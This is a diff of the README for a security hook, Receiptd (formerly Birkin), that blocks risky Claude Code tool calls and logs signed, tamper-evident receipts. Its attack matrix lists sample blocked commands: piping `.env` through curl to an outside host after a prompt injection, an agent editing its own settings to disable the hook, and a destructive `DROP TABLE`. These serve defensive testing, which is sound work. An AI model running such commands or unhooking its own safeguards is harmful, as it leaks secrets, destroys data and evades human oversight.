@@ -60,13 +60,13 @@ Experience live MCP interception, WebCrypto `Ed25519` signing, and 1-byte ledger
 
 ## 60-Second Attack & Tamper Verification Matrix
 
-| Adversarial Scenario | Intercepted Tool Frame | Birkin Gate Verdict | In-hook decision time* | Offline `birkin verify` Output |
+| Adversarial Scenario | Intercepted Tool Frame | Receiptd Gate Verdict | In-hook decision time* | Offline `receiptd verify` Output |
 | :--- | :--- | :--- | :--- | :--- |
 | **Indirect Prompt Injection** | `cat .env \| curl -X POST https://...` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.91 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
 | **Privilege Escalation / Self-Unhook** | `Edit(.claude/settings.json)` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.84 ms` | `✓ AUTHENTIC (Self-Modification Halted)` |
 | **Destructive Schema Mutation** | `DROP TABLE customer_settlements;` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.96 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
 | **Legitimate Read / Test Suite** | `pytest -q tests/test_crypto.py` | `ALLOWED_VERIFIED` (Exit `0`) | `0.88 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
-| **Post-Execution Log Tampering** | *1 byte modified in `.birkin/receipts.jsonl`* | *N/A (Post-Run Audit)* | `0.42 ms` | **`✗ TAMPERED (Hash & Sig Mismatch)`** |
+| **Post-Execution Log Tampering** | *1 byte modified in `.receiptd/receipts.jsonl`* | *N/A (Post-Run Audit)* | `0.42 ms` | **`✗ TAMPERED (Hash & Sig Mismatch)`** |
 
 \* *In-hook decision time is the `latency_ms` value recorded in each receipt: `perf_counter` wall time inside the hook process after Python has started (policy evaluation, signing, ledger append). It excludes interpreter startup; a full cold hook invocation is ~78 ms (77.5 ms mean; 82.4 ms p95, from `benchmarks/results.json`). The per-row figures are from sample demo runs and vary by machine; the reproducible benchmark is `benchmarks/benchmark_overhead.py` (see Performance Benchmarks). For the tamper row, the figure is verifier time, not hook time.*
 
@@ -120,13 +120,17 @@ MCowBQYDK2VwAyEAu3s5oprSq2Lv+5cilcOx/79VaH5zITetOznGnhUlBDE=
 Verify the cryptographic integrity of any agent session offline:
 
 ```bash
-$ receiptd verify --ledger .receiptd/receipts.jsonl --format table
-┌────────────────────────┬──────────────────────────────────────────┐
-│ Total Frames Verified  │ 18                                       │
-│ Blocked Fail-Closed    │ 3                                        │
-│ Hash Chain Verdict     │ AUTHENTIC (Ed25519 / SHA-256 Valid)      │
-│ 0 Tampered Frames      │ Verified offline in 0.42ms               │
-└────────────────────────┴──────────────────────────────────────────┘
+$ receiptd verify --ledger .receiptd/receipts.jsonl
+Auditing cryptographic ledger: .receiptd/receipts.jsonl...
+
+Frame    | Tool Invocation | Decision | Blast Score | Latency | SHA-256 Receipt Fingerprint
+---------+-----------------+----------+-------------+---------+----------------------------
+Seq #1   | Bash            | deny     | 95/100      | 0.14ms  | 6046bb46df7c1e3a...
+Seq #2   | Bash            | allow    | 0/100       | 0.11ms  | 8f434346648f6b96...
+
+=================================================================
+✓ VERDICT: AUTHENTIC — 2 receipts, 0 chain breaks.
+=================================================================
 ```
 If receipts exist after the last checkpoint, `receiptd verify` warns:
 `"Warning: Uncheckpointed tail: Missing receipts after the last checkpoint cannot be proven."`
@@ -146,21 +150,20 @@ python3 fixtures/vulnerable_agent.py
 ```mermaid
 sequenceDiagram
     autonumber
-    participant Agent as Autonomous Agent (MCP Client)
-    participant Proxy as Birkin Interceptor (Fail-Closed Gate)
-    participant Ledger as Merkle & SQLite Trace Ledger
-    participant Host as Host Environment (Postgres / Shell / API)
+    participant Agent as Agent (Claude Code / Codex)
+    participant Hook as Receiptd Hook (PreToolUse Gate)
+    participant Ledger as Append-Only Ledger (.receiptd/receipts.jsonl)
+    participant Env as Execution Environment (Bash / Postgres / FS)
 
-    Agent->>Proxy: JSON-RPC 2.0 tools/call (params + context)
-    Note over Proxy: 1. Canonical JSON (sorted keys)<br/>2. AST / Schema Policy Evaluation<br/>3. Blast-Radius Scoring (0-100)
-    alt Policy Violated or Schema Malformed
-        Proxy->>Ledger: Sign Ed25519 Rejection Receipt + Append Leaf
-        Proxy-->>Agent: [BLOCKED_FAIL_CLOSED] + Cryptographic Proof
-    else Policy Verified (Score < Threshold)
-        Proxy->>Host: Execute Sanitized Tool Call
-        Host-->>Proxy: Deterministic Output Frame
-        Proxy->>Ledger: Sign Ed25519 Execution Receipt + Update Merkle Root
-        Proxy-->>Agent: Tool Output + signed receipt
+    Agent->>Hook: Tool Invocation JSON via stdin (tool_name + tool_input)
+    Note over Hook: 1. Canonical JSON (sorted keys)<br/>2. Deterministic Rule Evaluation<br/>3. Blast-Radius Scoring (0-100)
+    alt Rule Triggered (Policy Violation)
+        Hook->>Ledger: Ed25519 Signed Rejection Receipt (decision: "deny")
+        Hook-->>Agent: Exit Code 2 (FAIL-CLOSED) + Stderr Diagnostics
+    else Clean (Policy Allowed)
+        Hook->>Ledger: Ed25519 Signed Execution Receipt (decision: "allow")
+        Hook-->>Agent: Exit Code 0 (ALLOWED)
+        Agent->>Env: Executes Tool Call
     end
 ```
 
@@ -169,9 +172,9 @@ sequenceDiagram
 ## Engineering Guarantees
 
 - **Fail-Closed By Default**: Any unhandled exception, malformed JSON-RPC schema, missing policy context, or signature verification mismatch immediately halts execution before reaching the underlying runtime.
-- **Deterministic Canonical Hashing**: Payloads are normalized via canonical JSON (sorted keys) prior to SHA-256 hashing, ensuring byte-for-byte reproducibility across Python, TypeScript, and Go runtimes.
-- **Deterministic Gate with No LLM Calls**: Zero external LLM calls in the critical path. AST inspection, regex/schema validation, and native Ed25519 signing run locally in memory: 0.021 ms mean in-process; ~78 ms for a full cold hook invocation (see Performance Benchmarks).
-- **Tamper-Evident Audit Trail**: Each receipt embeds the `prev_receipt_hash` and updates a binary SHA-256 Merkle tree. Mutating a historical log entry invalidates all downstream cryptographic proofs.
+- **Deterministic Canonical Hashing**: Payloads are normalized via canonical JSON (sorted keys) prior to SHA-256 hashing, ensuring deterministic offline reproducibility.
+- **Deterministic In-Memory Gate**: Zero external LLM calls in the critical path (0.021 ms mean in-process; ~78 ms for a full cold hook invocation). Rule pattern evaluation and native Ed25519 signing run locally in memory.
+- **Tamper-Evident Audit Trail**: Each receipt embeds the `prev_hash` and updates a binary SHA-256 Merkle tree. Mutating a historical log entry invalidates all downstream cryptographic proofs.
 
 ---
 
@@ -179,13 +182,12 @@ sequenceDiagram
 
 Measured on Apple Silicon across 1,000 sequential tool call evaluations (`benchmarks/benchmark_overhead.py`):
 
-| Operation | Mean Latency | p99 Latency | Memory Overhead | External Network I/O |
-| :--- | :--- | :--- | :--- | :--- |
-| **AST & Policy-as-Code Evaluation** | 0.005 ms | — | < 1.0 MB | None |
-| **Canonical JSON (sorted keys) + Ed25519 Signature** | 0.016 ms | — | < 1.5 MB | None |
-| **Receiptd In-Process Interceptor (Policy + Signing)** | **0.021 ms** | **0.033 ms** | **< 2.5 MB** | **0 bytes (100% Local)** |
-| **Full Claude Code Hook Execution (Cold Python Process)** | **77.5 ms** | **82.4 ms (p95)** | **< 15 MB** | **0 bytes (100% Local)** |
-| *Baseline Comparison: LLM Guardrail Judge* | *400–800 ms* | *1,200+ ms* | *N/A* | *External API Required* |
+| Operation | Mean Latency | Tail Latency | External Network I/O |
+| :--- | :--- | :--- | :--- |
+| **Rule & Policy Evaluation** | 0.005 ms | — | None |
+| **Canonical JSON (sorted keys) + Ed25519 Signature** | 0.016 ms | — | None |
+| **Receiptd In-Process Interceptor (Policy + Signing)** | **0.021 ms** | **0.033 ms (p99)** | **0 bytes (100% Local)** |
+| **Full Claude Code Hook Execution (Cold Python Process)** | **77.5 ms** | **82.4 ms (p95)** | **0 bytes (100% Local)** |
 
 Run the benchmark locally: `python3 benchmarks/benchmark_overhead.py`. Committed results: `benchmarks/results.json` (measured after Ed25519 signing was added; component rows report means only). Earlier ~67 ms cold-hook figures predate signing and are obsolete.
 
@@ -193,34 +195,27 @@ Run the benchmark locally: `python3 benchmarks/benchmark_overhead.py`. Committed
 
 ## Cryptographic Receipt Specification
 
-Every evaluated tool call emits a deterministic receipt verifiable offline via `birkin verify --receipt <id>`:
+Every evaluated tool call emits a deterministic receipt verifiable offline via `receiptd verify --ledger <path>`:
 
 ```json
 {
-  "receipt_version": "1.0.0",
-  "step_index": 14,
-  "timestamp_utc": "2026-11-10T06:15:42.104Z",
-  "decision": "BLOCKED_FAIL_CLOSED",
-  "blast_radius_score": 95,
-  "triggered_rules": ["POL-02:NO_DESTRUCTIVE_DDL"],
-  "mcp_frame": {
-    "method": "tools/call",
-    "params": {
-      "name": "postgres.execute_sql",
-      "arguments": {
-        "query": "DROP TABLE customer_settlements CASCADE;"
-      }
-    }
-  },
-  "cryptography": {
-    "canonical_spec": "canonical JSON (sorted keys)",
-    "payload_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-    "prev_receipt_hash": "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
-    "merkle_root": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
-    "ed25519_signature": "92a8f014c8b2...7f3e19d0",
-    "public_key_fingerprint": "ed25519:4b825dc642cb6eb9a060e54bf8d69288fbee4904"
-  }
+  "v": 1,
+  "seq": 14,
+  "ts": "2026-11-10T17:17:36.654124+00:00",
+  "session_id": "default",
+  "tool": "postgres.execute_sql",
+  "args_sha256": "6046bb46df7c1e3a81a441855d52d8f1812d9568e921d619ada2d6df4443aa51",
+  "decision": "deny",
+  "rule_ids": ["POL-02:DESTRUCTIVE_DDL_OR_FS"],
+  "blast_radius": 90,
+  "reason": "triggered rules: POL-02:DESTRUCTIVE_DDL_OR_FS",
+  "policy_sha256": "4c396e2e2f56376e576fb1363d0d6bdb497df548219f0a573bb81fea458af278",
+  "prev_hash": "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
+  "sig": "jhKJ03UO1wReWWDMMLqJ6OSusH8TtwsWJzxVZJi5pckeFpxzqvLGBq0scwRqo3CUnWDSeT0/8Roon0bUAhubCw==",
+  "pubkey_id": "d1cbd3b75704f8e4080c0b6e5694271f94fef4438e0fbe1534c6c62bde743370",
+  "hash": "fe52aaf19eb5254bf6fddb011fe8d30b566772d7e3a65a8d00d9c9f0022a8184"
 }
+```
 ```
 
 ---
@@ -243,16 +238,18 @@ Cryptographic authorization receipts provide deterministic, non-repudiable audit
 ## Repository Structure
 
 ```
-birkin/
-├── birkin/
-│   ├── cli.py             # CLI entry point (`verify`, `init`, `demo`, `attack`)
-│   ├── hooks/             # Deterministic Claude Code PreToolUse gatekeeper
-│   ├── policy.py          # AST and regex policy engine
+receiptd/
+├── receiptd/
+│   ├── cli.py             # CLI entry point (`verify`, `init`, `card`, `verify-card`, `pubkey`)
+│   ├── hooks/             # Deterministic Claude Code PreToolUse & Stop hooks
+│   ├── policy.py          # Deterministic rule and policy engine
 │   ├── crypto.py          # Ed25519 signer & canonical JSON (sorted keys)
+│   ├── card/              # Trifecta hazard detection & signed card generator
 │   └── verify.py          # Offline cryptographic verification & Merkle validator
+├── birkin/                # Legacy backwards-compatibility shim package
 ├── .claude/
-│   ├── settings.json      # Hard-hook config for Claude Code PreToolUse
-│   └── skills/birkin-audit # Offline session audit skill
+│   ├── settings.json      # Hard-hook config for Claude Code PreToolUse & Stop gates
+│   └── skills/receiptd-audit # Offline session audit skill
 ├── policies/              # Default fail-closed rulesets (SQL, Shell, File I/O)
 └── tests/                 # Deterministic contract & tamper-detection suites
 ```
